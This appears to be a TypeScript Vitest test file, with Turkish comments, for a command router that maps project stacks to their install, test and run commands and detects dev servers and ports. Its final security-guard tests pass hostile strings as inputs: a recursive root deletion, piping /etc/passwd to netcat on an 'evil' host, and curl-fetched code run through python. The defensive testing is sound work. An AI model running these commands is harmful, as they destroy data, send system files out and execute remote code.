import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  commandFor,
  deriveCommand,
  detectStack,
  expectedPortFor,
  isDevServerCommand,
  isUnsafeShellCommand,
} from "../../src/intent-router/handlers/command.js";

// v15.7 (2026-05-27): detectIntentKind regex KALDIRILDI — kind UI tarafında
// belirlenip caller'a verilir. Eski "regex parse text" testleri silindi;
// `deriveCommand` artık explicit `kind` parametresi alır.

describe("intent-router/command · commandFor (Node: script-tespiti; diğerleri: PROFİL tek kaynak)", () => {
  it("Node npm: install/test default + dev script var (nodeCommand MEKANİZMASI — profil değil)", async () => {
    expect(await commandFor("node-npm", "install")).toBe("npm install");
    expect(await commandFor("node-npm", "test")).toBe("npm test");
    expect(await commandFor("node-npm", "run", { dev: "vite" })).toBe("npm run dev");
    expect(await commandFor("node-npm", "run", { start: "node server" })).toBe("npm run start");
    expect(await commandFor("node-npm", "run")).toBeNull();
    expect(await commandFor("node-npm", "build", { build: "tsc" })).toBe("npm run build");
    expect(await commandFor("node-npm", "build")).toBeNull();
    expect(await commandFor("node-npm", "lint", { lint: "eslint ." })).toBe("npm run lint");
  });

  it("Node yarn/pnpm/bun: paket yöneticisi doğru prefix (2026-07-14 dersi: bu yol DOKUNULMAZ)", async () => {
    expect(await commandFor("node-yarn", "install")).toBe("yarn install");
    expect(await commandFor("node-yarn", "test")).toBe("yarn test");
    expect(await commandFor("node-yarn", "run", { dev: "x" })).toBe("yarn run dev");
    expect(await commandFor("node-pnpm", "install")).toBe("pnpm install");
    expect(await commandFor("node-pnpm", "test")).toBe("pnpm test");
    expect(await commandFor("node-bun", "install")).toBe("bun install");
    expect(await commandFor("node-bun", "test")).toBe("bun run test");
  });

  it("Rust (profil kanonik: build --release, clippy -D warnings)", async () => {
    expect(await commandFor("rust", "run")).toBe("cargo run");
    expect(await commandFor("rust", "test")).toBe("cargo test");
    expect(await commandFor("rust", "build")).toBe("cargo build --release");
    expect(await commandFor("rust", "install")).toBe("cargo fetch");
    expect(await commandFor("rust", "lint")).toBe("cargo clippy -- -D warnings");
  });

  it("Python (poetry/uv/pip) — run generic, dev'e düşmez", async () => {
    expect(await commandFor("python-poetry", "install")).toBe("poetry install");
    expect(await commandFor("python-poetry", "test")).toBe("poetry run pytest");
    expect(await commandFor("python-uv", "install")).toBe("uv sync");
    expect(await commandFor("python-uv", "test")).toBe("uv run pytest");
    expect(await commandFor("python-pip", "install")).toBe("pip install -r requirements.txt");
    expect(await commandFor("python-pip", "test")).toBe("pytest");
    expect(await commandFor("python-pip", "run")).toBe("python main.py");
  });

  it("Go", async () => {
    expect(await commandFor("go", "run")).toBe("go run .");
    expect(await commandFor("go", "test")).toBe("go test ./...");
    expect(await commandFor("go", "build")).toBe("go build ./...");
    expect(await commandFor("go", "install")).toBe("go mod download");
  });

  it("Ruby / PHP / Maven / Gradle / Elixir / Swift / .NET / Deno (profil kanonik değerler)", async () => {
    expect(await commandFor("ruby", "install")).toBe("bundle install");
    expect(await commandFor("php", "install")).toBe("composer install");
    expect(await commandFor("maven", "test")).toBe("mvn test");
    expect(await commandFor("maven", "install")).toBe("mvn install -DskipTests");
    expect(await commandFor("gradle", "build")).toBe("./gradlew build -x test");
    expect(await commandFor("gradle", "install")).toBe("./gradlew dependencies");
    expect(await commandFor("elixir", "install")).toBe("mix deps.get");
    expect(await commandFor("swift", "build")).toBe("swift build");
    expect(await commandFor("dotnet", "test")).toBe("dotnet test");
    expect(await commandFor("deno", "test")).toBe("deno test");
    // deno install: eski switch "deno cache --reload ." ve eski profil "... deno.json"
    // İKİSİ DE geçersiz çağrıydı → Deno 2 kanoniği
    expect(await commandFor("deno", "install")).toBe("deno install");
  });

  it("run niyeti: profil run yoksa dev'e düşer (maven/deno)", async () => {
    expect(await commandFor("maven", "run")).toBe("mvn spring-boot:run");
    expect(await commandFor("deno", "run")).toBe("deno task dev");
  });

  it("dart vs flutter — ayrı stack'ler, ayrı komutlar (2026-07-16 drift kökü)", async () => {
    expect(await commandFor("dart", "run")).toBe("dart run");
    expect(await commandFor("dart", "test")).toBe("dart test");
    expect(await commandFor("flutter", "run")).toBe("flutter run");
    expect(await commandFor("flutter", "test")).toBe("flutter test");
    expect(await commandFor("flutter", "install")).toBe("flutter pub get");
  });

  it("unknown stack → null", async () => {
    expect(await commandFor("unknown", "run")).toBeNull();
    expect(await commandFor("unknown", "test")).toBeNull();
  });
});

describe("intent-router/command · eski switch değerleri uygunluk tablosu (anti-drift korkuluğu)", () => {
  // 2026-07-16: 19-case hardcode switch silindi → tek kaynak profil. Bu tablo SİLİNEN
  // switch'in değerlerini fixture olarak DONDURUR; kasıtlı farklar beyaz listede.
  // Bir profil değeri istemeden değişirse (ne fixture ne beyaz liste) bu test kırmızı yanar.
  const OLD_SWITCH: Record<string, Record<string, string | null>> = {
    deno: { run: "deno task dev", test: "deno test", build: "deno task build", install: "deno cache --reload .", lint: "deno lint" },
    rust: { run: "cargo run", test: "cargo test", build: "cargo build", install: "cargo fetch", lint: "cargo clippy" },
    "python-poetry": { run: "poetry run python main.py", test: "poetry run pytest", build: null, install: "poetry install", lint: "poetry run ruff check ." },
    "python-uv": { run: "uv run python main.py", test: "uv run pytest", build: null, install: "uv sync", lint: "uv run ruff check ." },
    "python-pip": { run: "python main.py", test: "pytest", build: null, install: "pip install -r requirements.txt", lint: "ruff check ." },
    go: { run: "go run .", test: "go test ./...", build: "go build ./...", install: "go mod download", lint: "go vet ./..." },
    ruby: { run: "bundle exec ruby main.rb", test: "bundle exec rspec", build: null, install: "bundle install", lint: "bundle exec rubocop" },
    php: { run: "php -S localhost:8000", test: "vendor/bin/phpunit", build: null, install: "composer install", lint: "vendor/bin/phpcs" },
    maven: { run: "mvn spring-boot:run", test: "mvn test", build: "mvn package", install: "mvn install", lint: "mvn checkstyle:check" },
    gradle: { run: "./gradlew run", test: "./gradlew test", build: "./gradlew build", install: "./gradlew build", lint: "./gradlew check" },
    elixir: { run: "mix run --no-halt", test: "mix test", build: "mix compile", install: "mix deps.get", lint: "mix credo" },
    dart: { run: "dart run", test: "dart test", build: "dart compile exe bin/main.dart", install: "dart pub get", lint: "dart analyze" },
    flutter: { run: "flutter run", test: "flutter test", build: "flutter build apk", install: "flutter pub get", lint: "flutter analyze" },
    swift: { run: "swift run", test: "swift test", build: "swift build", install: "swift package resolve", lint: null },
    dotnet: { run: "dotnet run", test: "dotnet test", build: "dotnet build", install: "dotnet restore", lint: "dotnet format --verify-no-changes" },
  };
  // Kasıtlı farklar: "stack:intent" → yeni kanonik değer (gerekçe commit mesajında).
  const INTENTIONAL: Record<string, string | null> = {
    "deno:install": "deno install",
    "rust:build": "cargo build --release",
    "rust:lint": "cargo clippy -- -D warnings",
    "go:lint": "golangci-lint run",
    "ruby:run": "bundle exec ruby main.rb", // aynı — run anahtarı profile taşındı
    "php:lint": "vendor/bin/phpstan analyse",
    "maven:install": "mvn install -DskipTests",
    "gradle:build": "./gradlew build -x test",
    "gradle:install": "./gradlew dependencies",
    "elixir:lint": "mix credo --strict",
    "swift:lint": "swiftlint",
    "dotnet:build": "dotnet build --configuration Release",
  };
  const INTENTS = ["run", "test", "build", "install", "lint"] as const;

  for (const [stack, cmds] of Object.entries(OLD_SWITCH)) {
    it(`${stack}: her niyet ya eski değer ya beyaz listeli kanonik`, async () => {
      for (const intent of INTENTS) {
        const actual = await commandFor(stack as never, intent);
        const key = `${stack}:${intent}`;
        const expected = key in INTENTIONAL ? INTENTIONAL[key] : cmds[intent];
        expect(actual, key).toBe(expected);
      }
    });
  }
});

describe("intent-router/command · detectStack + deriveCommand (FS integration)", () => {
  let tmpRoot: string;

  beforeEach(() => {
    tmpRoot = mkdtempSync(join(tmpdir(), "mycl-cmd-test-"));
  });
  afterEach(() => {
    rmSync(tmpRoot, { recursive: true, force: true });
  });

  it("package.json yok → unknown stack", () => {
    expect(detectStack(tmpRoot)).toBe("unknown");
  });

  it("package.json varsa node-npm (lock dosyası yok)", () => {
    writeFileSync(join(tmpRoot, "package.json"), JSON.stringify({ name: "x" }));
    expect(detectStack(tmpRoot)).toBe("node-npm");
  });

  it("pnpm-lock.yaml + package.json → node-pnpm", () => {
    writeFileSync(join(tmpRoot, "package.json"), JSON.stringify({ name: "x" }));
    writeFileSync(join(tmpRoot, "pnpm-lock.yaml"), "");
    expect(detectStack(tmpRoot)).toBe("node-pnpm");
  });

  it("Cargo.toml → rust", () => {
    writeFileSync(join(tmpRoot, "Cargo.toml"), "[package]\nname=\"x\"");
    expect(detectStack(tmpRoot)).toBe("rust");
  });

  it("pyproject.toml + tool.poetry → python-poetry", () => {
    writeFileSync(join(tmpRoot, "pyproject.toml"), "[tool.poetry]\nname=\"x\"");
    expect(detectStack(tmpRoot)).toBe("python-poetry");
  });

  it("pyproject.toml + uv.lock → python-uv", () => {
    writeFileSync(join(tmpRoot, "pyproject.toml"), "[project]\nname=\"x\"");
    writeFileSync(join(tmpRoot, "uv.lock"), "");
    expect(detectStack(tmpRoot)).toBe("python-uv");
  });

  it("pubspec.yaml + sdk: flutter → flutter; saf pubspec → dart (içerik koklaması)", () => {
    writeFileSync(
      join(tmpRoot, "pubspec.yaml"),
      "name: app\ndependencies:\n  flutter:\n    sdk: flutter\n",
    );
    expect(detectStack(tmpRoot)).toBe("flutter");
    writeFileSync(join(tmpRoot, "pubspec.yaml"), "name: app\ndependencies:\n  http: ^1.0.0\n");
    expect(detectStack(tmpRoot)).toBe("dart");
  });

  it("requirements.txt → python-pip", () => {
    writeFileSync(join(tmpRoot, "requirements.txt"), "requests==2.0");
    expect(detectStack(tmpRoot)).toBe("python-pip");
  });

  it("go.mod → go", () => {
    writeFileSync(join(tmpRoot, "go.mod"), "module x");
    expect(detectStack(tmpRoot)).toBe("go");
  });

  it(".csproj → dotnet", () => {
    writeFileSync(join(tmpRoot, "App.csproj"), "<Project/>");
    expect(detectStack(tmpRoot)).toBe("dotnet");
  });

  it("deriveCommand: hint öncelikli (stack tespitini bypass eder)", async () => {
    expect(await deriveCommand(tmpRoot, null, "make build")).toBe("make build");
  });

  it("deriveCommand: Node + dev script → npm run dev", async () => {
    writeFileSync(
      join(tmpRoot, "package.json"),
      JSON.stringify({ name: "x", scripts: { dev: "vite" } }),
    );
    expect(await deriveCommand(tmpRoot, "run")).toBe("npm run dev");
    expect(await deriveCommand(tmpRoot, "test")).toBe("npm test");
  });

  it("deriveCommand: Rust projesi → cargo komutları", async () => {
    writeFileSync(join(tmpRoot, "Cargo.toml"), "[package]\nname=\"x\"");
    expect(await deriveCommand(tmpRoot, "run")).toBe("cargo run");
    expect(await deriveCommand(tmpRoot, "test")).toBe("cargo test");
    expect(await deriveCommand(tmpRoot, "build")).toBe("cargo build --release");
  });

  it("deriveCommand: Python (uv) → uv komutları", async () => {
    writeFileSync(join(tmpRoot, "pyproject.toml"), "[project]\nname=\"x\"");
    writeFileSync(join(tmpRoot, "uv.lock"), "");
    expect(await deriveCommand(tmpRoot, "install")).toBe("uv sync");
    expect(await deriveCommand(tmpRoot, "test")).toBe("uv run pytest");
  });

  it("deriveCommand: Go projesi", async () => {
    writeFileSync(join(tmpRoot, "go.mod"), "module x");
    expect(await deriveCommand(tmpRoot, "run")).toBe("go run .");
    expect(await deriveCommand(tmpRoot, "build")).toBe("go build ./...");
  });

  it("deriveCommand: unknown stack + kind verilse de null", async () => {
    // mkdir ama hiçbir manifest yazma — stack 'unknown' olur
    mkdirSync(join(tmpRoot, "subdir"));
    expect(await deriveCommand(tmpRoot, "run")).toBeNull();
  });

  it("deriveCommand: kind null + hint yok → null (caller hata göstermeli)", async () => {
    writeFileSync(
      join(tmpRoot, "package.json"),
      JSON.stringify({ name: "x" }),
    );
    expect(await deriveCommand(tmpRoot, null)).toBeNull();
  });
});

describe("intent-router/command · isDevServerCommand (multi-stack web server)", () => {
  it("Node dev/start scripts (npm/yarn/pnpm/bun)", () => {
    expect(isDevServerCommand("npm run dev")).toBe(true);
    expect(isDevServerCommand("yarn run dev")).toBe(true);
    expect(isDevServerCommand("pnpm run start")).toBe(true);
    expect(isDevServerCommand("bun run dev")).toBe(true);
    expect(isDevServerCommand("npx vite")).toBe(true);
    expect(isDevServerCommand("vite")).toBe(true);
    expect(isDevServerCommand("next dev")).toBe(true);
    expect(isDevServerCommand("webpack-dev-server")).toBe(true);
  });

  it("Python web framework'leri", () => {
    expect(isDevServerCommand("uvicorn main:app --reload")).toBe(true);
    expect(isDevServerCommand("gunicorn app:wsgi")).toBe(true);
    expect(isDevServerCommand("hypercorn main:app")).toBe(true);
    expect(isDevServerCommand("flask run")).toBe(true);
    expect(isDevServerCommand("python manage.py runserver")).toBe(true);
  });

  it("Ruby web framework'leri", () => {
    expect(isDevServerCommand("bundle exec rails server")).toBe(true);
    expect(isDevServerCommand("rails s")).toBe(true);
    expect(isDevServerCommand("bundle exec puma")).toBe(true);
  });

  it("PHP / Elixir / JVM / .NET", () => {
    expect(isDevServerCommand("php -S localhost:8000")).toBe(true);
    expect(isDevServerCommand("php artisan serve")).toBe(true);
    expect(isDevServerCommand("mix phx.server")).toBe(true);
    expect(isDevServerCommand("mvn spring-boot:run")).toBe(true);
    expect(isDevServerCommand("./gradlew bootRun")).toBe(true);
    expect(isDevServerCommand("dotnet run")).toBe(true);
    expect(isDevServerCommand("dotnet watch run")).toBe(true);
  });

  it("CLI / build / test komutları → false (dev server değil)", () => {
    expect(isDevServerCommand("cargo run")).toBe(false);
    expect(isDevServerCommand("go run .")).toBe(false);
    expect(isDevServerCommand("swift run")).toBe(false);
    expect(isDevServerCommand("npm test")).toBe(false);
    expect(isDevServerCommand("cargo build")).toBe(false);
    expect(isDevServerCommand("mvn test")).toBe(false);
  });
});

describe("intent-router/command · expectedPortFor (framework default port)", () => {
  it("Node frameworkler", () => {
    expect(expectedPortFor("npm run dev")).toBe(5173);
    expect(expectedPortFor("npx vite")).toBe(5173);
    expect(expectedPortFor("next dev")).toBe(3000);
  });

  it("Python", () => {
    expect(expectedPortFor("uvicorn main:app")).toBe(8000);
    expect(expectedPortFor("gunicorn app:wsgi")).toBe(8000);
    expect(expectedPortFor("flask run")).toBe(5000);
    expect(expectedPortFor("python manage.py runserver")).toBe(8000);
  });

  it("Ruby Rails / Puma", () => {
    expect(expectedPortFor("rails s")).toBe(3000);
    expect(expectedPortFor("bundle exec rails server")).toBe(3000);
    expect(expectedPortFor("bundle exec puma")).toBe(9292);
  });

  it("PHP built-in port'u command line'dan okur", () => {
    expect(expectedPortFor("php -S localhost:9001")).toBe(9001);
    expect(expectedPortFor("php -S 0.0.0.0:8080")).toBe(8080);
    expect(expectedPortFor("php artisan serve")).toBe(8000);
  });

  it("Elixir Phoenix / Spring Boot / .NET", () => {
    expect(expectedPortFor("mix phx.server")).toBe(4000);
    expect(expectedPortFor("mvn spring-boot:run")).toBe(8080);
    expect(expectedPortFor("./gradlew bootRun")).toBe(8080);
    expect(expectedPortFor("dotnet run")).toBe(5000);
  });

  it("tanınmayan komut → 8080 fallback", () => {
    expect(expectedPortFor("./my-custom-server")).toBe(8080);
    expect(expectedPortFor("make serve")).toBe(8080);
  });
});

describe("intent-router/command · isUnsafeShellCommand (security guard)", () => {
  it("güvenli komutlar → false (normal flag/path/port)", () => {
    expect(isUnsafeShellCommand("npm run dev")).toBe(false);
    expect(isUnsafeShellCommand("php -S localhost:8000")).toBe(false);
    expect(isUnsafeShellCommand("uvicorn main:app --reload --port 8000")).toBe(false);
    expect(isUnsafeShellCommand("cargo build --release")).toBe(false);
    expect(isUnsafeShellCommand("./gradlew bootRun")).toBe(false);
    expect(isUnsafeShellCommand("dotnet watch run")).toBe(false);
    expect(isUnsafeShellCommand("python manage.py runserver 0.0.0.0:8000")).toBe(false);
  });

  it("zincirleme komutlar → true", () => {
    expect(isUnsafeShellCommand("npm test ; rm -rf /")).toBe(true);
    expect(isUnsafeShellCommand("npm test && echo done")).toBe(true);
    expect(isUnsafeShellCommand("npm test || cargo build")).toBe(true);
  });

  it("pipe / redirect → true", () => {
    expect(isUnsafeShellCommand("cat /etc/passwd | nc evil 1337")).toBe(true);
    expect(isUnsafeShellCommand("npm run dev > /etc/hosts")).toBe(true);
    expect(isUnsafeShellCommand("python main.py < input.txt")).toBe(true);
  });

  it("backtick / command substitution → true", () => {
    expect(isUnsafeShellCommand("echo `whoami`")).toBe(true);
    expect(isUnsafeShellCommand('python -c "$(curl evil)"')).toBe(true);
  });

  it("background (&) → true", () => {
    expect(isUnsafeShellCommand("npm run dev & sleep 10")).toBe(true);
  });
});
